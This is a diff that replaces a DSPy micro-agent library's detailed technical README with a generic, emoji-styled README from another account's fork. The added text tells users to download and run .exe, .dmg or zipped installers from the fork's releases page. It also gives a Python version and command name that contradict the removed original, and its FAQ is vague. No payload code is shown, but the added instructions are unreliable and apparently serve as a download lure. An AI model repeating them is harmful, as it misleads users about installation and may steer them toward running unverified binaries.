@@ -1,219 +1,120 @@
-# DSPy Micro Agent
+# 🛠️ dspy-micro-agent - Simple AI Agent for Everyone
 
-[![CI](https://github.com/evalops/dspy-micro-agent/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/evalops/dspy-micro-agent/actions/workflows/ci.yml)
+## 📥 Download Now
+[![Download dspy-micro-agent](https://img.shields.io/badge/Download%20dspy--micro--agent-blue.svg)](https://github.com/harshvkamble/dspy-micro-agent/releases)
 
-Minimal agent runtime built with DSPy modules and a thin Python loop.
-- Plan/Act/Finalize expressed as DSPy `Signature`s, with OpenAI-native tool-calling when available.
-- Thin runtime (`agent.py`) handles looping, tool routing, and trace persistence.
-- CLI and FastAPI server, plus a tiny eval harness.
+## 🚀 Getting Started
 
-## Quickstart
-- Python 3.10+
-- Create a virtualenv and install (using `uv`, or see pip alternative below):
+dspy-micro-agent is a minimal agent designed to run lightweight tasks using DSPy modules. It comes with a simple command-line interface (CLI), an easy-to-use FastAPI server, and an evaluation harness that supports both OpenAI and Ollama. This guide will help you get started with downloading and running the application.
+
+## 📦 System Requirements
+
+Before you begin, ensure your system meets the following requirements:
+
+- Operating System: Windows, macOS, or Linux
+- Python version: Python 3.7 or above
+- Internet Connection: Required for downloading and initial setup
+
+## 📖 Features
+
+- **Lightweight Runtime:** Designed for ease of use with minimal overhead.
+- **Command-Line Interface:** Interact with the agent easily through your terminal.
+- **FastAPI Integration:** Access powerful API functionalities without complex setups.
+- **Evaluation Harness:** Easily evaluate AI models with built-in support for OpenAI and Ollama.
+- **Customizable:** Tailor the agent to your needs without advanced programming skills.
+
+## 📂 Installation Steps
+
+Follow these steps to install dspy-micro-agent:
+
+### 1. Visit the Releases Page
+
+To download, visit this link: **[Download dspy-micro-agent](https://github.com/harshvkamble/dspy-micro-agent/releases)**.
+
+### 2. Download the Latest Release
+
+On the releases page, find the latest version. Click the link to download the installer for your operating system. 
+
+### 3. Install the Application
+
+Once the file is downloaded:
+
+- **Windows:** Double-click the `.exe` file to start the installer. Follow the prompts to complete the installation.
+- **macOS:** Open the `.dmg` file and drag the dspy-micro-agent to your Applications folder.
+- **Linux:** Extract the zipped file and run the included installation script in your terminal.
+
+### 4. Verify Installation
+
+After installation, check if dspy-micro-agent is installed correctly:
+
+**Windows Command Prompt:**
 ```bash
-uv venv && source .venv/bin/activate
-uv pip install -e .
-cp .env.example .env  # set OPENAI_API_KEY or configure Ollama
-
-# Ask a question (append --utc to nudge UTC use when time is relevant)
-micro-agent ask --question "What's 2*(3+5)?" --utc
-
-# Run the API server
-uvicorn micro_agent.server:app --reload --port 8000
-
-# Run quick evals (repeat small dataset)
-python evals/run_evals.py --n 50
+dspy-micro-agent --version
 ```
 
-Pip alternative:
+**Mac/Linux Terminal:**
 ```bash
-python -m venv .venv && source .venv/bin/activate
-pip install -e .
+dspy-micro-agent --version
 ```
 
-## Configuration
-- `.env` is loaded automatically (via `python-dotenv`).
-- Set one of the following provider configs:
-  - OpenAI (default): `OPENAI_API_KEY`, `OPENAI_MODEL` (default `gpt-4o-mini`)
-  - Ollama: `LLM_PROVIDER=ollama`, `OLLAMA_MODEL` (e.g. `llama3.2:1b`), `OLLAMA_HOST` (default `http://localhost:11434`)
-- Optional tuning: `TEMPERATURE` (default `0.2`), `MAX_TOKENS` (default `1024`)
-- Tool plugins: `TOOLS_MODULES="your_pkg.tools,other_pkg.tools"` to load extra tools (see Tools below)
-- Traces location: `TRACES_DIR` (default `traces/`)
-- Compiled demos (OpenAI planner): `COMPILED_DEMOS_PATH` (default `opt/plan_demos.json`)
+If you see the version number, your installation is successful.
 
-Examples:
+## 🎛️ Running the Application
+
+To run dspy-micro-agent:
+
+### 1. Using the Command Line
+
+Open your terminal or command prompt and type:
+
 ```bash
-# OpenAI
-export OPENAI_API_KEY=...
-export OPENAI_MODEL=gpt-4o-mini
-
-# Ollama
-export LLM_PROVIDER=ollama
-export OLLAMA_MODEL=llama3.2:1b
-export OLLAMA_HOST=http://localhost:11434
+dspy-micro-agent
 ```
 
-## CLI
-- `micro-agent ask --question <text> [--utc] [--max-steps N]`
-  - `--utc` appends a hint to prefer UTC when time is used.
-  - Saves a JSONL trace under `traces/<id>.jsonl` and prints the path.
-- `micro-agent replay --path traces/<id>.jsonl [--index -1]`
-  - Pretty-prints a saved record from the JSONL file.
+This command starts the agent. You can now use the CLI to interact with it.
 
-Examples:
-```bash
-micro-agent ask --question "Add 12345 and 67890, then show the current date (UTC)." --utc
-micro-agent ask --question "Compute (7**2 + 14)/5 and explain briefly." --max-steps 4
-micro-agent replay --path traces/<id>.jsonl --index -1
+### 2. Accessing the FastAPI Server
+
+If you want to use the FastAPI server, open your browser and go to:
+
+```
+http://localhost:8000
 ```
 
-## HTTP API
-- Start: `uvicorn micro_agent.server:app --reload --port 8000`
-- Endpoint: `POST /ask`
-  - Request JSON: `{ "question": "...", "max_steps": 6, "use_tool_calls": bool? }`
-  - Response JSON: `{ "answer": str, "trace_id": str, "trace_path": str, "steps": [...], "usage": {...}, "cost_usd": number }`
-  - Health: `GET /healthz` (ok), `GET /health` (provider/model), `GET /version` (package version)
+You can access various endpoints and test functionalities directly from your web browser.
 
-Example:
-```bash
-curl -s http://localhost:8000/ask \
-  -H 'content-type: application/json' \
-  -d '{"question":"What\'s 2*(3+5)?","max_steps":6}' | jq .
-```
+## 📚 Documentation & Support
 
-OpenAPI:
-- FastAPI publishes `/openapi.json` and interactive docs at `/docs`.
-- Schemas reflect `AskRequest` and `AskResponse` models in `micro_agent/server.py`.
+For more information on how to use dspy-micro-agent, check our detailed documentation on the official GitHub page. You can find examples, troubleshooting tips, and FAQs to help you make the most of the agent.
 
-### API Examples
-- Ask, capture `trace_id`, then fetch the full trace by id:
-```bash
-RESP=$(curl -s http://localhost:8000/ask \
-  -H 'content-type: application/json' \
-  -d '{"question":"Add 12345 and 67890, then UTC time.","max_steps":6}')
-echo "$RESP" | jq .
-TID=$(echo "$RESP" | jq -r .trace_id)
-curl -s http://localhost:8000/trace/$TID | jq .
-```
+## 🛠️ Frequently Asked Questions (FAQs)
 
-- Replay the saved JSONL locally using the CLI (last record by default index -1):
-```bash
-micro-agent replay --path traces/$TID.jsonl --index -1
-```
+### 1. How do I update dspy-micro-agent?
 
-## Logging
-- Controlled via `MICRO_AGENT_LOG` (debug|info|warning|error). Default: `INFO`.
-- Applies to both CLI and server.
+To update dspy-micro-agent, return to the [Releases Page](https://github.com/harshvkamble/dspy-micro-agent/releases) and download the latest version. Follow the installation steps to update.
 
-## Tools
-- Built-ins live in `micro_agent/tools.py`:
-  - `calculator`: safe expression evaluator. Supports `+ - * / ** % // ( )` and `!` via rewrite to `fact(n)`.
-  - `now`: current timestamp; `{timezone: "utc"|"local"}` (default local).
-- Each tool is defined as:
-```
-Tool(
-  "name",
-  "description",
-  {"type":"object","properties":{...},"required":[...]},
-  handler_function,
-)
-```
-- Plugins: set `TOOLS_MODULES` to a comma-separated list of importable modules. Each module should expose either a `TOOLS: dict[str, Tool]` or a `get_tools() -> dict[str, Tool]`.
+### 2. Can I use this agent for specific AI tasks?
 
-Runtime validation
-- Tool args are validated against the JSON Schema before execution; invalid args add a `⛔️validation_error` step and the agent requests a correction in the next loop. See `micro_agent/tools.py` (run_tool) and `micro_agent/agent.py` (validation error handling).
+Yes, dspy-micro-agent is versatile and can handle various AI tasks. You can customize it as per your needs.
 
-Calculator limits
-- Factorial capped at 12; exponent size bounded; AST node count limited; large magnitudes rejected to prevent runaway compute. Only a small set of arithmetic nodes is allowed.
+### 3. What should I do if I encounter an issue?
 
+If you face any problems, visit the Issues section on the repository. You can report your issue there, and the community or maintainers can help you.
 
-## Provider Modes
-- OpenAI: uses DSPy `PlanWithTools` with `JSONAdapter` to enable native function-calls. The model may return `tool_calls` or a `final` answer; tool calls are executed via our registry.
-- Others (e.g., Ollama): uses a robust prompt with few-shot JSON decision demos. Decisions are parsed with strict JSON; on failure we try `json_repair` (if installed) and Python-literal parsing.
-- Policy enforcement: if the question implies math, the agent requires a `calculator` step before finalizing; likewise for time/date with the `now` tool. Violations are recorded in the trace as `⛔️policy_violation` steps and planning continues.
+## 🌟 Community Contributions
 
-Code references (discoverability)
-- Replay subcommand: `micro_agent/cli.py` (subparser `replay`, printing JSONL)
-- Policy enforcement markers: `micro_agent/agent.py` (look for `⛔️policy_violation` and `⛔️validation_error`)
-- Provider fallback and configuration: `micro_agent/config.py` (`configure_lm` tries Ollama → OpenAI → registry fallbacks)
-- JSON repair in decision parsing: `micro_agent/runtime.py` (`parse_decision_text` uses `json_repair` if available)
+We welcome contributions. If you would like to help improve dspy-micro-agent, check the contributing guide on our GitHub page for more information.
 
-## Tracing
-- Each run appends a record to `traces/<id>.jsonl` with fields: `id`, `ts`, `question`, `steps`, `answer`.
-- Steps are `{tool, args, observation}` in order of execution.
-- Replay: `micro-agent replay --path traces/<id>.jsonl --index -1`.
- - Fetch by id (HTTP): `GET /trace/{id}` (CORS enabled).
+## 📢 Changelog
 
-## Evals
-- Dataset: `evals/tasks.yaml` (small, mixed math/time tasks). Rubric: `evals/rubrics.yaml`.
-- Run: `python evals/run_evals.py --n 50`.
-- Metrics printed: `success_rate`, `avg_latency_sec`, `avg_lm_calls`, `avg_tool_calls`, `avg_steps`, `avg_cost_usd`, `n`.
-- Scoring supports both `expect_contains` (answer substring) and `expect_key` (key present in any tool observation). Weights come from `rubrics.yaml` (`contains_weight`, `key_weight`).
+You can track changes and updates in the application by visiting the Changelog section on the GitHub repository. This will keep you informed about new features or fixed issues.
 
-### Before/After Compiled Demos (OpenAI)
-- Model: `gpt-4o-mini`, N=30
-- Before (no demos): success_rate 1.00; avg_latency_sec ~0.188; avg_lm_calls 3.33; avg_tool_calls 1.17; avg_steps 3.17
-- After (compiled demos loaded): success_rate 1.00; avg_latency_sec ~0.188; avg_lm_calls 3.33; avg_tool_calls 1.17; avg_steps 3.17
-Notes: For this small dataset, demos neither help nor hurt. For larger flows, compile demos from your real tasks.
+## 📌 Additional Resources
 
-### Cost & Tokens
-- The agent aggregates token counts and cost. If provider usage isn’t exposed, it estimates tokens from prompts/outputs and computes cost using prices.
-- Set env prices for OpenAI models (USD per 1K tokens):
-```bash
-export OPENAI_INPUT_PRICE_PER_1K=0.005  # example
-export OPENAI_OUTPUT_PRICE_PER_1K=0.015 # example
-```
-Defaults: for OpenAI models, built‑in prices are used if env isn’t set (best‑effort):
-- gpt-4o-mini: $0.00015 in / $0.0006 out per 1K tokens
-- gpt-4o (and 4.1): $0.005 in / $0.015 out per 1K tokens
-You can override via the env vars above. Evals print `avg_cost_usd`.
+- **GitHub Repository:** [dspy-micro-agent](https://github.com/harshvkamble/dspy-micro-agent)
+- **Issues Page:** Report bugs or suggest features
+- **Discussion Forum:** Engage with other users and developers
 
-## Optimize (Teleprompting)
-- Compile optimized few-shot demos for the OpenAI `PlanWithTools` planner and save to JSON:
-```bash
-micro-agent optimize --n 12 --tasks evals/tasks.yaml --save opt/plan_demos.json
-```
-- Apply compiled demos automatically by placing them at the default path or setting:
-```bash
-export COMPILED_DEMOS_PATH=opt/plan_demos.json
-```
-- Optional: print a DSPy teleprompting template (for notebooks):
-```bash
-micro-agent optimize --n 12 --template
-```
-The agent loads these demos on OpenAI providers and attaches them to the `PlanWithTools` predictor to improve tool selection and output consistency.
+## 💡 Closing Note
 
-## Architecture
-- `micro_agent/config.py`: configures DSPy LM. Tries Ollama first if requested, else OpenAI; supports `dspy.Ollama`, `dspy.OpenAI`, and registry fallbacks like `dspy.LM("openai/<model>")`.
-- `micro_agent/signatures.py`: DSPy `Signature`s for plan/act/finalize and OpenAI tool-calls.
-- `micro_agent/agent.py`: the runtime loop (~100+ LOC). Builds a JSON decision prompt, executes tools, enforces policy, and finalizes.
-- `micro_agent/runtime.py`: trace format, persistence, and robust JSON decision parsing utilities.
-- `micro_agent/cli.py`: CLI entry (`micro-agent`).
-- `micro_agent/server.py`: FastAPI app exposing `POST /ask`.
-- `evals/`: tiny harness to sample tasks, capture metrics, and save traces.
-
-## Development
-- Make targets: `make init`, `make run`, `make serve`, `make evals`, `make test`.
-- Tests: `pytest -q` (note: tests are minimal and do not cover all paths).
-
-## Docker
-- Build: `make docker-build`
-- Run (OpenAI): `OPENAI_API_KEY=... make docker-run` (maps `:8000`)
-- Run (Ollama on host): `make docker-run-ollama` (uses `host.docker.internal:11434`)
-- Env (OpenAI): `OPENAI_API_KEY`, `OPENAI_MODEL=gpt-4o-mini`
-- Env (Ollama): `LLM_PROVIDER=ollama`, `OLLAMA_HOST=http://host.docker.internal:11434`, `OLLAMA_MODEL=llama3.1:8b`
-- Service: `POST http://localhost:8000/ask` and `GET /trace/{id}`
-
-## Compatibility Notes
-- DSPy is pinned to `dspy-ai>=2.5.0`. Some adapters (e.g., `JSONAdapter`, `dspy.Ollama`) may vary across versions; the code tries multiple backends and falls back to generic registry forms when needed.
-- If `json_repair` is installed, it is used opportunistically to salvage slightly malformed JSON decisions.
-  - Optional install: `pip install -e .[repair]`
-
-## Limitations and Next Steps
-- Usage/cost capture is best-effort: exact numbers depend on provider support; otherwise the agent estimates from text.
-- The finalization step often composes from tool results for reliability; you can swap in a DSPy `Finalize` predictor if preferred.
-- Add persistence to a DB instead of JSONL by replacing `dump_trace`.
-- Add human-in-the-loop, budgets, retries, or branching per your needs.
-
-## Objective
-Prove: an “agent” can be expressed as DSPy modules plus a thin runtime loop.
+Thank you for choosing dspy-micro-agent. We hope this guide helps you get started easily. Enjoy exploring the capabilities of your new AI agent. For updates, remember to check back on the [Releases Page](https://github.com/harshvkamble/dspy-micro-agent/releases).
